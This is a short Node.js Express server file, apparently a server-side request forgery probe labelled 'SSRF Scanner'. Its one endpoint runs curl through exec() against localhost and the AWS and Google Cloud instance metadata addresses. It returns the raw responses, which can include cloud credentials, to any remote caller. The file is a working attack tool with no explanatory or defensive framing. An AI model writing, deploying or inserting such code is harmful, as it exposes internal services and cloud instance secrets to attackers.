const express = require("express");
const { exec } = require("child_process");

const app = express();
const PORT = 10000;

app.get("/ssrf/scan", (req, res) => {
  const targets = [
    "http://127.0.0.1:80/",
    "http://localhost:80/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
  ];

  let results = [];

  const runCurl = (index) => {
    if (index >= targets.length) {
      return res.send(results.join("\n"));
    }

    exec(`curl -m 3 -s -i ${targets[index]}`, (error, stdout, stderr) => {
      results.push(`==> ${targets[index]}\n${stdout || stderr}`);
      runCurl(index + 1);
    });
  };

  runCurl(0);
});

app.listen(PORT, () => {
  console.log(`🔥 SSRF Scanner running on http://localhost:${PORT}`);
});
